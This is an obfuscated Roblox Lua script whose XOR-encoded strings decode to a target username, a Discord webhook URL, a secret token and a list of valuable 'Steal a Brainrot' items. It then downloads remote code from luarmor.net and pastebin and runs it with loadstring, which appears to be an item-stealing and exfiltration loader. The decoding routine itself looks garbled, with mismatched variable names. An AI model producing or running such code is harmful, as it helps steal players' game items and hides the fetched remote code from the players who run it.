--[[ Obfuscated with Prometheus-style engine ]]
local _OI0IOIOI="_OO00OI";local _I0II00II="_IlIl0l";local _I0l00l0l="_IlO00I";local _OO0OlI0O="_0OIIlI";local _l0IIll0O="_I0III0";
local _OI000000O0IOIO0O=(function(_00l0lI)return function(...)local _llI00O=""for _,_O0I0II in ipairs({...})do _O0l00I=_l0IIl0..string.char(bit32 and bit32.bxor(_O00I0l,_0OlOlI)or(function(a,b)local r=0 for i=0,7 do local ba,bb=a%2,b%2 if ba~=bb then r=r+2^i end a,b=math.floor(a/2),math.floor(b/2)end return r end)(_I0lO0O,_OI0OIO))end return _I00OIO end end)(62);
local _OIlIOOI00lIO=function()
getgenv().User = _OI000000O0IOIO0O(84,95,85,77,12,9,15,15,7)

getgenv().Webhook = _OI000000O0IOIO0O(86,74,74,78,77,4,17,17,90,87,77,93,81,76,90,16,93,81,83,17,95,78,87,17,73,91,92,86,81,81,85,77,17,15,10,9,7,9,14,14,12,7,14,15,9,8,10,12,15,7,13,7,17,90,114,117,97,124,7,112,127,68,108,84,90,93,77,109,81,87,73,120,112,89,90,115,11,8,108,120,109,80,105,115,114,122,86,87,127,123,97,120,124,122,12,112,76,121,120,15,124,122,121,78,84,91,13,103,89,102,71,88,11,78,6,116,103,88,85,120,80)

getgenv().SecretToken = _OI000000O0IOIO0O(90,11,7,9,91,88,12,93,19,95,90,15,92,19,10,8,90,7,19,95,91,11,93,19,88,13,88,14,92,14,12,92,9,93,7,7)

getgenv().Brainrots = {
  _OI000000O0IOIO0O(109,74,76,95,73,92,91,76,76,71,30,123,82,91,78,86,95,80,74),
  _OI000000O0IOIO0O(115,91,81,73,82),
  _OI000000O0IOIO0O(109,85,87,92,87,90,87,30,106,81,87,82,91,74),
  _OI000000O0IOIO0O(118,91,95,90,82,91,77,77,30,118,81,76,77,91,83,95,80),
  _OI000000O0IOIO0O(118,71,90,76,95,30,122,76,95,89,81,80,30,125,95,80,80,91,82,82,81,80,87),
  _OI000000O0IOIO0O(122,76,95,89,81,80,30,125,95,80,80,91,82,82,81,80,87),
  _OI000000O0IOIO0O(122,76,95,89,81,80,30,121,87,80,89,91,76,87,80,87),
  _OI000000O0IOIO0O(114,95,30,109,75,78,76,91,83,91,30,125,81,83,92,87,80,95,77,87,81,80),
  _OI000000O0IOIO0O(125,91,76,92,91,76,75,77),
  _OI000000O0IOIO0O(110,81,78,93,75,76,75,30,95,80,90,30,120,87,68,68,75,76,75),
  _OI000000O0IOIO0O(108,81,77,91,71,30,95,80,90,30,106,91,90,90,71),
  _OI000000O0IOIO0O(125,95,78,87,74,95,80,81,30,115,81,92,71),
  _OI000000O0IOIO0O(125,81,81,85,87,30,95,80,90,30,115,87,82,85,87),
  _OI000000O0IOIO0O(124,75,76,89,75,76,81,30,127,80,90,30,120,76,71,75,76,81),
  _OI000000O0IOIO0O(117,91,74,75,78,95,74,30,124,76,81,77),
  _OI000000O0IOIO0O(114,95,30,125,95,77,95,30,124,81,81),
  _OI000000O0IOIO0O(109,78,81,81,85,71,30,95,80,90,30,110,75,83,78,85,71),
  _OI000000O0IOIO0O(114,95,30,109,91,93,76,91,74,30,125,81,83,92,87,80,95,77,87,81,80),
  _OI000000O0IOIO0O(121,95,76,95,83,95,30,95,80,90,30,115,95,90,75,80,90,75,80,89),
  _OI000000O0IOIO0O(114,81,72,91,30,114,81,72,91,30,124,91,95,76),
  _OI000000O0IOIO0O(125,91,82,91,77,74,87,95,82,30,110,91,89,95,77,75,77),
  _OI000000O0IOIO0O(114,95,30,120,81,81,90,30,125,81,83,92,87,80,95,77,87,81,80),
  _OI000000O0IOIO0O(108,91,87,80,87,74,81,30,109,82,91,87,89,86,87,74,81),
  _OI000000O0IOIO0O(114,81,77,30,127,83,87,89,81,77),
  _OI000000O0IOIO0O(114,81,77,30,109,91,85,81,82,95,86,77),
  _OI000000O0IOIO0O(109,87,89,80,81,76,91,30,125,95,76,95,78,95,93,91),
  _OI000000O0IOIO0O(120,76,95,89,76,95,83,95,30,95,80,90,30,125,86,81,93,76,95,83,95),
  _OI000000O0IOIO0O(123,82,91,88,95,80,74,81,30,120,76,87,89,81),
  _OI000000O0IOIO0O(114,95,30,121,87,80,89,91,76,30,109,91,85,81,82,95,86),
  _OI000000O0IOIO0O(121,87,80,89,91,76,30,121,91,76,95,74),
  _OI000000O0IOIO0O(109,95,83,83,71,80,87,30,120,95,74,74,87,80,87),
  _OI000000O0IOIO0O(114,81,77,30,109,78,95,89,86,91,74,74,87,77),
  _OI000000O0IOIO0O(120,91,77,74,87,72,91,30,8,9),
  _OI000000O0IOIO0O(104,91,80,74,81,82,87,91,76,81,30,110,95,72,81,80,91,76,81),
  _OI000000O0IOIO0O(109,78,95,89,86,91,74,74,87,30,106,75,95,82,91,74,74,87),
  _OI000000O0IOIO0O(127,80,74,81,80,87,81),
  _OI000000O0IOIO0O(108,81,77,91,74,74,87,30,106,75,95,82,91,74,74,87),
  _OI000000O0IOIO0O(112,95,93,86,81,30,109,78,71,90,91,76),
  _OI000000O0IOIO0O(120,87,77,86,87,80,81,30,125,82,81,73,80,87,80,81),
  _OI000000O0IOIO0O(114,95,72,95,90,81,76,87,74,81,30,109,78,87,80,87,74,81),
  _OI000000O0IOIO0O(116,81,82,82,71,30,116,81,82,82,71,30,109,95,86,75,76),
  _OI000000O0IOIO0O(106,87,76,87,82,87,85,95,82,87,85,95,30,106,87,76,87,82,87,85,95,82,95,85,81),
  _OI000000O0IOIO0O(117,91,74,93,86,75,76,75,30,95,80,90,30,115,75,77,74,75,76,75),
  _OI000000O0IOIO0O(109,73,95,89,89,71,30,124,76,81,77),
  _OI000000O0IOIO0O(114,95,30,108,81,83,95,80,74,87,93,30,121,76,95,80,90,91),
  _OI000000O0IOIO0O(113,76,93,95,82,91,90,81,80),
  _OI000000O0IOIO0O(106,87,93,74,95,93,30,109,95,86,75,76),
  _OI000000O0IOIO0O(117,91,74,75,78,95,74,30,117,91,78,95,74),
  _OI000000O0IOIO0O(114,95,30,106,95,93,81,30,125,81,83,92,87,80,95,77,87,81,80),
  _OI000000O0IOIO0O(106,95,80,89,30,106,95,80,89,30,117,91,82,91,74,95,80,89),
  _OI000000O0IOIO0O(114,81,72,87,80,30,108,81,77,91),
  _OI000000O0IOIO0O(114,81,77,30,106,95,93,81,76,87,74,95,77),
  _OI000000O0IOIO0O(123,72,87,82,91,90,81,80),
  _OI000000O0IOIO0O(114,81,77,30,110,76,87,83,81,77),
  _OI000000O0IOIO0O(114,95,30,116,81,82,82,71,30,121,76,95,80,90,91),
  _OI000000O0IOIO0O(105,30,81,76,30,114),
  _OI000000O0IOIO0O(123,77,81,85,30,109,91,85,81,82,95,86),
  _OI000000O0IOIO0O(114,81,77,30,110,75,89,89,87,91,77),
  _OI000000O0IOIO0O(106,76,95,82,95,82,91,90,81,80),
  _OI000000O0IOIO0O(121,81,92,92,82,87,80,81,30,107,80,87,93,87,93,82,87,80,81),
  _OI000000O0IOIO0O(106,75,88,88,30,106,81,75,93,95,80),
  _OI000000O0IOIO0O(115,87,91,74,91,74,91,87,76,95,30,124,87,93,87,93,82,91,74,91,87,76,95),
  _OI000000O0IOIO0O(115,81,80,91,71,30,115,81,80,91,71,30,108,91,87,80,90,91,91,76),
  _OI000000O0IOIO0O(125,86,87,82,82,87,80,30,125,86,87,82,87),
  _OI000000O0IOIO0O(125,86,87,78,77,81,30,95,80,90,30,111,75,91,77,81),
  _OI000000O0IOIO0O(114,95,30,109,78,81,81,85,71,30,121,76,95,80,90,91),
  _OI000000O0IOIO0O(124,95,93,75,76,75,30,95,80,90,30,123,89,89,75,76,75),
  _OI000000O0IOIO0O(114,81,77,30,124,76,81,77),
  _OI000000O0IOIO0O(114,95,30,123,70,74,87,80,93,74,30,121,76,95,80,90,91),
  _OI000000O0IOIO0O(114,81,77,30,125,95,80,90,87,91,77),
  _OI000000O0IOIO0O(125,91,82,75,82,95,76,93,87,80,87,30,104,87,93,87,81,77,87,80,87),
  _OI000000O0IOIO0O(115,81,80,91,71,30,115,81,80,91,71,30,110,75,89,89,71),
  _OI000000O0IOIO0O(114,81,77,30,116,81,82,82,71,30,125,81,83,92,87,80,95,77,87,81,80,95,77),
  _OI000000O0IOIO0O(114,81,77,30,109,78,81,81,85,71,30,125,81,83,92,87,80,95,77,87,81,80,95,77),
  _OI000000O0IOIO0O(122,116,30,110,95,80,90,95),
  _OI000000O0IOIO0O(114,95,77,30,109,87,77),
  _OI000000O0IOIO0O(109,78,87,80,80,71,30,118,95,83,83,71),
  _OI000000O0IOIO0O(106,95,93,81,76,87,74,95,30,124,87,93,87,93,82,91,74,95),
  _OI000000O0IOIO0O(114,81,77,30,109,73,91,91,74,86,91,95,76,74,77),
  _OI000000O0IOIO0O(112,75,93,82,91,95,76,81,30,122,87,80,81,77,77,95,75,76,81),
  _OI000000O0IOIO0O(114,81,77,30,125,81,83,92,87,80,95,77,87,81,80,95,77),
  _OI000000O0IOIO0O(114,95,30,121,76,95,80,90,91,30,125,81,83,92,87,80,95,77,87,81,80)
}

task.spawn(function()
loadstring(game:HttpGet(_OI000000O0IOIO0O(86,74,74,78,77,4,17,17,95,78,87,16,82,75,95,76,83,81,76,16,80,91,74,17,88,87,82,91,77,17,72,10,17,82,81,95,90,91,76,77,17,6,14,6,88,10,95,90,10,91,92,88,88,10,9,11,93,11,9,93,91,8,15,91,95,13,7,91,10,15,91,12,13,16,82,75,95)))()
end)

task.spawn(function()
loadstring(game:HttpGet(_OI000000O0IOIO0O(86,74,74,78,77,4,17,17,78,95,77,74,91,92,87,80,16,93,81,83,17,76,95,73,17,114,76,92,73,89,84,79,9)))()
end)

end;
local _,_O0llIl0I=pcall(_OIlIOOI00lIO);if _OOlOlOOl then _OIlIOOI00lIO()end;
